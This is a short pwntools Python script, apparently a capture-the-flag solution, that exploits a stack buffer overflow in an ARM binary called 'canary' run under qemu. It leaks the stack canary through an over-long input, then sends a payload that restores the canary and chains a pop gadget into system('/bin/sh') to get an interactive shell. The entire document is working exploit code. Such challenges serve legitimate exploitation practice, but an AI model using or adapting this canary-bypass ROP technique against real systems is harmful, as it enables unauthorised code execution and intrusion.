from pwn import *

gdbcmds = '''
b *0x00010534
c
'''

context.binary = 'canary'
#target = gdb.debug(context.binary.path, gdbscript=gdbcmds)
target = process(["qemu-arm", "./canary"])

binsh = 0x00071eb0
system = 0x00016d90
pop_r0_r4_pc = 0x00026b7c

print(target.recvuntil(b">"))
payload = b"A"*41
target.send(payload)

leak = target.recvline()
canary = leak[-4:-1]
canary = u32(b"\x00"+canary)
print("Canary", hex(canary))

payload = b""
payload += b"A"*40
payload += p32(canary)
payload += b"A"*12
payload += p32(pop_r0_r4_pc)
payload += p32(binsh)
payload += p32(0x0)
payload += p32(system)

print(target.recvuntil(b">"))
target.sendline(payload)
#print(target.recvuntil(b">"))
target.sendline()

target.interactive()
